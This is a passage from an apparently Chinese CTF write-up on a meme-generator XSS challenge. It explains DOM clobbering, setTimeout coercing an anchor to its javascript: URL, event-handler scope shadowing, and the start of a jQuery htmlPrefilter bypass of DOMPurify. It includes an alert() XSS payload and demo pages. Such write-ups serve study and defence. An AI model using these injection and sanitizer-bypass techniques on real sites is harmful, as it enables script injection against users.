class="function"><span class="params">_</span> =&gt;</span> &#123;</span><br><span class="line">      $(<span class="string">"#status"</span>).remove();</span><br><span class="line">      notify ? $(<span class="string">"#notify"</span>).html(html) : <span class="string">""</span>;</span><br><span class="line">      $(<span class="string">"#meme-code"</span>).text(template);</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h6 id="用来进行-DOM-元素操作等，看起来我们的目标就是setTimeout函数中通过-“-notify”-html-html-来执行代码了，所以我们可能需要想办法把-notify-参数设置为-true。"><a href="#用来进行-DOM-元素操作等，看起来我们的目标就是setTimeout函数中通过-“-notify”-html-html-来执行代码了，所以我们可能需要想办法把-notify-参数设置为-true。" class="headerlink" title="用来进行 DOM 元素操作等，看起来我们的目标就是setTimeout函数中通过$(“#notify”).html(html)来执行代码了，所以我们可能需要想办法把 notify 参数设置为 true。"></a>用来进行 DOM 元素操作等，看起来我们的目标就是setTimeout函数中通过$(“#notify”).html(html)来执行代码了，所以我们可能需要想办法把 notify 参数设置为 true。</h6><h5 id="DOM-Clobbering"><a href="#DOM-Clobbering" class="headerlink" title="DOM Clobbering"></a>DOM Clobbering</h5><h6 id="首先我们先来看看几个比较有趣的例子："><a href="#首先我们先来看看几个比较有趣的例子：" class="headerlink" title="首先我们先来看看几个比较有趣的例子："></a>首先我们先来看看几个比较有趣的例子：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">domain</span> <span class="attr">name</span>=<span class="string">domain</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(domain);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">document</span>.domain);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">window</span>.domain);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="结果如下："><a href="#结果如下：" class="headerlink" title="结果如下："></a>结果如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img id=&quot;domain&quot; name=&quot;domain&quot;&gt;</span><br><span class="line">&lt;img id=&quot;domain&quot; name=&quot;domain&quot;&gt;</span><br><span class="line">&lt;img id=&quot;domain&quot; name=&quot;domain&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="可以通过一些标签的id-name-属性来控制document-window-通过DOM-API-BOM-API-获取到的某个东西。"><a href="#可以通过一些标签的id-name-属性来控制document-window-通过DOM-API-BOM-API-获取到的某个东西。" class="headerlink" title="可以通过一些标签的id(name)属性来控制document(window)通过DOM API(BOM API)获取到的某个东西。"></a>可以通过一些标签的id(name)属性来控制document(window)通过DOM API(BOM API)获取到的某个东西。</h6><h5 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout"></a>setTimeout</h5><h6 id="我们了解了Dom-Clobberimg-之后，我们可以先看看可以怎么通过setTimeout来利用"><a href="#我们了解了Dom-Clobberimg-之后，我们可以先看看可以怎么通过setTimeout来利用" class="headerlink" title="我们了解了Dom Clobberimg 之后，我们可以先看看可以怎么通过setTimeout来利用"></a>我们了解了Dom Clobberimg 之后，我们可以先看看可以怎么通过setTimeout来利用</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"a"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    a.innerHTML = <span class="keyword">new</span> URL(location).searchParams.get(<span class="string">'b'</span>);</span></span><br><span class="line">    setTimeout(ok, 2000)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="简化了一下题目代码，对于以上的代码，我们可以通过利用Dom-Clobbering来实现XSS，因为我们可以直接传入id为ok的标签进行xss，例如传入"><a href="#简化了一下题目代码，对于以上的代码，我们可以通过利用Dom-Clobbering来实现XSS，因为我们可以直接传入id为ok的标签进行xss，例如传入" class="headerlink" title="简化了一下题目代码，对于以上的代码，我们可以通过利用Dom Clobbering来实现XSS，因为我们可以直接传入id为ok的标签进行xss，例如传入"></a>简化了一下题目代码，对于以上的代码，我们可以通过利用Dom Clobbering来实现XSS，因为我们可以直接传入id为ok的标签进行xss，例如传入</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=ok href=javascript:alert()&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="可是为什么呢？"><a href="#可是为什么呢？" class="headerlink" title="可是为什么呢？"></a>可是为什么呢？</h6><h6 id="根据-MDN-文档，setTimeout的第一个参数，必须是个函数或字符串。可是根据-Dom-Clobbering-，这里的ok应该是一个-a-标签，既然这不是个函数，它就尝试用toString方法转换成字符串，而根据-MDN-文档-HTMLAnchorElement"><a href="#根据-MDN-文档，setTimeout的第一个参数，必须是个函数或字符串。可是根据-Dom-Clobbering-，这里的ok应该是一个-a-标签，既然这不是个函数，它就尝试用toString方法转换成字符串，而根据-MDN-文档-HTMLAnchorElement" class="headerlink" title="根据 MDN 文档，setTimeout的第一个参数，必须是个函数或字符串。可是根据 Dom Clobbering ，这里的ok应该是一个 a 标签，既然这不是个函数，它就尝试用toString方法转换成字符串，而根据 MDN 文档 HTMLAnchorElement"></a>根据 MDN 文档，setTimeout的第一个参数，必须是个函数或字符串。可是根据 Dom Clobbering ，这里的ok应该是一个 a 标签，既然这不是个函数，它就尝试用toString方法转换成字符串，而根据 MDN 文档 <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement" target="_blank" rel="noopener">HTMLAnchorElement</a></h6><h6 id="HTMLHyperlinkElementUtils-toString"><a href="#HTMLHyperlinkElementUtils-toString" class="headerlink" title="HTMLHyperlinkElementUtils.toString()"></a><a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLHyperlinkElementUtils/toString" target="_blank" rel="noopener">HTMLHyperlinkElementUtils.toString()</a></h6><h6 id="Returns-a-USVString-containing-the-whole-URL-It-is-a-synonym-for-HTMLHyperlinkElementUtils-href-though-it-can’t-be-used-to-modify-the-value"><a href="#Returns-a-USVString-containing-the-whole-URL-It-is-a-synonym-for-HTMLHyperlinkElementUtils-href-though-it-can’t-be-used-to-modify-the-value" class="headerlink" title="Returns a USVString containing the whole URL. It is a synonym for HTMLHyperlinkElementUtils.href, though it can’t be used to modify the value."></a>Returns a <a href="https://developer.mozilla.org/en-US/docs/Web/API/USVString" target="_blank" rel="noopener">USVString</a> containing the whole URL. It is a synonym for <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLHyperlinkElementUtils/href" target="_blank" rel="noopener">HTMLHyperlinkElementUtils.href</a>, though it can’t be used to modify the value.</h6><h6 id="而当-a-标签通过toString-方法转换我们可以得到它的-href-属性，也就是javascript-alert-，所以我们就可以执行代码了。"><a href="#而当-a-标签通过toString-方法转换我们可以得到它的-href-属性，也就是javascript-alert-，所以我们就可以执行代码了。" class="headerlink" title="而当 a 标签通过toString()方法转换我们可以得到它的 href 属性，也就是javascript:alert()，所以我们就可以执行代码了。"></a>而当 a 标签通过toString()方法转换我们可以得到它的 href 属性，也就是javascript:alert()，所以我们就可以执行代码了。</h6><h6 id="例如："><a href="#例如：" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">ok</span> <span class="attr">href</span>=<span class="string">javascript:alert()</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> anchor = <span class="built_in">document</span>.getElementById(<span class="string">"ok"</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> result = anchor.toString();</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(result);</span></span><br><span class="line">    setTimeout(result,2000);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="notify"><a href="#notify" class="headerlink" title="notify"></a>notify</h5><h6 id="好了，回到我们的-notify-上，虽然我们可以通过-DOM-Clobbering-进行”污染”一些参数，但是题目直接规定了let-notify-false，浏览器当然也不可能允许我们修改服务端的代码，这可怎么办？"><a href="#好了，回到我们的-notify-上，虽然我们可以通过-DOM-Clobbering-进行”污染”一些参数，但是题目直接规定了let-notify-false，浏览器当然也不可能允许我们修改服务端的代码，这可怎么办？" class="headerlink" title="好了，回到我们的 notify 上，虽然我们可以通过 DOM Clobbering 进行”污染”一些参数，但是题目直接规定了let notify = false，浏览器当然也不可能允许我们修改服务端的代码，这可怎么办？"></a>好了，回到我们的 notify 上，虽然我们可以通过 DOM Clobbering 进行”污染”一些参数，但是题目直接规定了let notify = false，浏览器当然也不可能允许我们修改服务端的代码，这可怎么办？</h6><h6 id="其实这里的-notify-比较具有误导性，比较像-C-语言入门的时候函数传参部分，我们把整个代码改一下："><a href="#其实这里的-notify-比较具有误导性，比较像-C-语言入门的时候函数传参部分，我们把整个代码改一下：" class="headerlink" title="其实这里的 notify 比较具有误导性，比较像 C 语言入门的时候函数传参部分，我们把整个代码改一下："></a>其实这里的 notify 比较具有误导性，比较像 C 语言入门的时候函数传参部分，我们把整个代码改一下：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> memeGen = <span class="function">(<span class="params">that, notify</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (text &amp;&amp; img) &#123;</span></span><br><span class="line">template = memeTemplate(img, text);</span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (notify) &#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">//...</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="comment">/* Main */</span></span></span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> notify = <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> text = <span class="keyword">new</span> URL(location).searchParams.get(<span class="string">"text"</span>);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> img = <span class="keyword">new</span> URL(location).searchParams.get(<span class="string">"img"</span>);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">if</span> (text &amp;&amp; img) &#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.write(</span></span><br><span class="line"><span class="xml">      `<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"alert alert-primary"</span> <span class="attr">role</span>=<span class="string">"alert"</span> <span class="attr">id</span>=<span class="string">"status"</span>&gt;</span>` +</span></span><br><span class="line"><span class="javascript">      <span class="string">`&lt;img class="circle" src="<span class="subst">$&#123;<span class="built_in">escape</span>(</span></span></span></span><br><span class="line">        img</span><br><span class="line"><span class="javascript">      )&#125;<span class="string">" onload="</span>memeGen(<span class="keyword">this</span>, notify)<span class="string">"&gt;` +</span></span></span><br><span class="line"><span class="javascript">      <span class="string">`Creating meme... (<span class="subst">$&#123;DOMPurify.sanitize(text)&#125;</span>)&lt;/div&gt;`</span></span></span><br><span class="line">    );</span><br><span class="line"><span class="javascript">  &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">    $(<span class="string">"#meme-code"</span>).text(</span></span><br><span class="line">      memeTemplate(</span><br><span class="line"><span class="javascript">        <span class="string">"https://i.imgur.com/PdbDexI.jpg"</span>,</span></span><br><span class="line"><span class="javascript">        <span class="string">"When you get that WW3 draft letter"</span></span></span><br><span class="line">      )</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="再简化一下就成了我们的C语言函数传参的练习题了"><a href="#再简化一下就成了我们的C语言函数传参的练习题了" class="headerlink" title="再简化一下就成了我们的C语言函数传参的练习题了"></a>再简化一下就成了我们的C语言函数传参的练习题了</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> memeGen = <span class="function">(<span class="params">that, x</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (x) &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h6 id="为了易于理解我们可以写成这样就不易弄混了，所以，对于memeGen来说，notify只是一个参数变量名，区别于我们一开始提到的-Javascript-Scope-部分，该函数内的notify参数变量取决于该函数所在的作用域。"><a href="#为了易于理解我们可以写成这样就不易弄混了，所以，对于memeGen来说，notify只是一个参数变量名，区别于我们一开始提到的-Javascript-Scope-部分，该函数内的notify参数变量取决于该函数所在的作用域。" class="headerlink" title="为了易于理解我们可以写成这样就不易弄混了，所以，对于memeGen来说，notify只是一个参数变量名，区别于我们一开始提到的 Javascript Scope 部分，该函数内的notify参数变量取决于该函数所在的作用域。"></a>为了易于理解我们可以写成这样就不易弄混了，所以，对于memeGen来说，notify只是一个参数变量名，区别于我们一开始提到的 Javascript Scope 部分，该函数内的notify参数变量取决于该函数所在的作用域。</h6><h6 id="而对于memeGen函数来说，它的作用域并非是在let-notify-false所处的-JS-代码域当中，而是在通过document-write函数之后的作用域，所以这里就涉及到了作用域的问题。"><a href="#而对于memeGen函数来说，它的作用域并非是在let-notify-false所处的-JS-代码域当中，而是在通过document-write函数之后的作用域，所以这里就涉及到了作用域的问题。" class="headerlink" title="而对于memeGen函数来说，它的作用域并非是在let notify = false所处的 JS 代码域当中，而是在通过document.write函数之后的作用域，所以这里就涉及到了作用域的问题。"></a>而对于memeGen函数来说，它的作用域并非是在let notify = false所处的 JS 代码域当中，而是在通过document.write函数之后的作用域，所以这里就涉及到了作用域的问题。</h6><h5 id="javaScript-Scope"><a href="#javaScript-Scope" class="headerlink" title="javaScript Scope"></a>javaScript Scope</h5><h6 id="所以对于执行document-write函数过后，也就是对于onload-memeGen函数来说，其作用域并非是-JS-的作用域，在题目中本来这么几个作用域：window、script、onload，其中-window-包含了后两个，后两个互不包含，所以这里在-onload-找不到-notify-变量，就会去-window-的作用域找，就会把-script-作用域当中的-notify-给找到，notify-变量也就成-false-了。"><a href="#所以对于执行document-write函数过后，也就是对于onload-memeGen函数来说，其作用域并非是-JS-的作用域，在题目中本来这么几个作用域：window、script、onload，其中-window-包含了后两个，后两个互不包含，所以这里在-onload-找不到-notify-变量，就会去-window-的作用域找，就会把-script-作用域当中的-notify-给找到，notify-变量也就成-false-了。" class="headerlink" title="所以对于执行document.write函数过后，也就是对于onload=memeGen函数来说，其作用域并非是 JS 的作用域，在题目中本来这么几个作用域：window、script、onload，其中 window 包含了后两个，后两个互不包含，所以这里在 onload 找不到 notify 变量，就会去 window 的作用域找，就会把 script 作用域当中的 notify 给找到，notify 变量也就成 false 了。"></a>所以对于执行document.write函数过后，也就是对于onload=memeGen函数来说，其作用域并非是 JS 的作用域，在题目中本来这么几个作用域：window、script、onload，其中 window 包含了后两个，后两个互不包含，所以这里在 onload 找不到 notify 变量，就会去 window 的作用域找，就会把 script 作用域当中的 notify 给找到，notify 变量也就成 false 了。</h6><h6 id="我们也可以通过一个简单的例子来理解："><a href="#我们也可以通过一个简单的例子来理解：" class="headerlink" title="我们也可以通过一个简单的例子来理解："></a>我们也可以通过一个简单的例子来理解：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">name</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> test = <span class="function">(<span class="params">that,x</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">"Test'x: "</span> + x);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(x)&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">"JS Magic"</span>);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> x = <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"JS'x: "</span> + x);</span></span><br><span class="line"><span class="xml">    document.write("<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">test(this,x)</span>&gt;</span>");</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="结果如下：-1"><a href="#结果如下：-1" class="headerlink" title="结果如下："></a>结果如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JS&apos;x: false</span><br><span class="line">Test&apos;x: 16</span><br><span class="line">JS Magic</span><br></pre></td></tr></table></figure>
+
+<h6 id="原理都是一样的，这里test函数在onerror作用域找到了-x-变量，所以就不会再去找-window-作用域下的-x-false变量了，所以本题我们需要引入一个name-notify的标签来“覆盖”掉原来的-notify-变量。"><a href="#原理都是一样的，这里test函数在onerror作用域找到了-x-变量，所以就不会再去找-window-作用域下的-x-false变量了，所以本题我们需要引入一个name-notify的标签来“覆盖”掉原来的-notify-变量。" class="headerlink" title="原理都是一样的，这里test函数在onerror作用域找到了 x 变量，所以就不会再去找 window 作用域下的 x=false变量了，所以本题我们需要引入一个name=notify的标签来“覆盖”掉原来的 notify 变量。"></a>原理都是一样的，这里test函数在onerror作用域找到了 x 变量，所以就不会再去找 window 作用域下的 x=false变量了，所以本题我们需要引入一个name=notify的标签来“覆盖”掉原来的 notify 变量。</h6><h6 id="其实这也是一开始我们可以发现题目给出的代码有一处也比较神奇就是-text-amp-img"><a href="#其实这也是一开始我们可以发现题目给出的代码有一处也比较神奇就是-text-amp-img" class="headerlink" title="其实这也是一开始我们可以发现题目给出的代码有一处也比较神奇就是 text &amp; img"></a>其实这也是一开始我们可以发现题目给出的代码有一处也比较神奇就是 text &amp; img</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> memeGen = <span class="function">(<span class="params">that, notify</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (text &amp;&amp; img) &#123;</span><br><span class="line">    template = memeTemplate(img, text);</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h6 id="memeGen函数在函数内找不到text，onload-的作用域也找不到text，就会去-script下面找，而多个-script-属于同一个作用域，所以对于函数当中的-text-以及-img-，它是在下一块-JS-代码段定义的。"><a href="#memeGen函数在函数内找不到text，onload-的作用域也找不到text，就会去-script下面找，而多个-script-属于同一个作用域，所以对于函数当中的-text-以及-img-，它是在下一块-JS-代码段定义的。" class="headerlink" title="memeGen函数在函数内找不到text，onload 的作用域也找不到text，就会去 script下面找，而多个 script 属于同一个作用域，所以对于函数当中的 text 以及 img ，它是在下一块 JS 代码段定义的。"></a>memeGen函数在函数内找不到text，onload 的作用域也找不到text，就会去 script下面找，而多个 script 属于同一个作用域，所以对于函数当中的 text 以及 img ，它是在下一块 JS 代码段定义的。</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">let</span> notify = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">let</span> text = <span class="keyword">new</span> URL(location).searchParams.get(<span class="string">"text"</span>);</span><br><span class="line"><span class="keyword">let</span> img = <span class="keyword">new</span> URL(location).searchParams.get(<span class="string">"img"</span>);</span><br><span class="line">  ...</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="JQuery-39-s-39-mXSS-39"><a href="#JQuery-39-s-39-mXSS-39" class="headerlink" title="JQuery&#39;s &#39;mXSS&#39;"></a><code>JQuery&#39;s &#39;mXSS&#39;</code></h5><h6 id="所以基本上-notify-的问题我们解决了，接下来就是-DOM-Purify-的问题了。"><a href="#所以基本上-notify-的问题我们解决了，接下来就是-DOM-Purify-的问题了。" class="headerlink" title="所以基本上 notify 的问题我们解决了，接下来就是 DOM Purify 的问题了。"></a>所以基本上 notify 的问题我们解决了，接下来就是 DOM Purify 的问题了。</h6><h6 id="我们可以知道最终我们要插入的代码是通过-“-notify”-html-html-来插入的，而参数-html-又来自"><a href="#我们可以知道最终我们要插入的代码是通过-“-notify”-html-html-来插入的，而参数-html-又来自" class="headerlink" title="我们可以知道最终我们要插入的代码是通过$(“#notify”).html(html)来插入的，而参数 html 又来自"></a>我们可以知道最终我们要插入的代码是通过$(“#notify”).html(html)来插入的，而参数 html 又来自</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html = <span class="string">`&lt;div class="alert alert-warning" role="alert"&gt;&lt;b&gt;Meme&lt;/b&gt; created from <span class="subst">$&#123;DOMPurify.sanitize(text)&#125;</span>&lt;/div&gt;`</span>;</span><br></pre></td></tr></table></figure>
+
+<h6 id="简单跟一下-JQuery-的-html-函数，我们可以发现有以下利用链："><a href="#简单跟一下-JQuery-的-html-函数，我们可以发现有以下利用链：" class="headerlink" title="简单跟一下 JQuery 的 html() 函数，我们可以发现有以下利用链："></a>简单跟一下 JQuery 的 html() 函数，我们可以发现有以下利用链：</h6><h6 id="html-gt-append-gt-doManip-gt-buildFragment-gt-htmlPrefilter"><a href="#html-gt-append-gt-doManip-gt-buildFragment-gt-htmlPrefilter" class="headerlink" title="html()-&gt;append()-&gt;doManip()-&gt;buildFragment()-&gt;htmlPrefilter()"></a><a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js" target="_blank" rel="noopener">html()-&gt;append()-&gt;doManip()-&gt;buildFragment()-&gt;htmlPrefilter()</a></h6><h6 id="在htmlPrefilter-函数中我们可以看到有这么一段代码："><a href="#在htmlPrefilter-函数中我们可以看到有这么一段代码：" class="headerlink" title="在htmlPrefilter()函数中我们可以看到有这么一段代码："></a>在<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js%23L202" target="_blank" rel="noopener">htmlPrefilter()</a>函数中我们可以看到有这么一段代码：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// source of htmlPrefilter()</span></span><br><span class="line">jQuery.extend( &#123;</span><br><span class="line">htmlPrefilter: <span class="function"><span class="keyword">function</span>(<span class="params"> html </span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> html.replace( rxhtmlTag, <span class="string">"&lt;$1&gt;&lt;/$2&gt;"</span> );</span><br><span class="line">&#125;,</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+
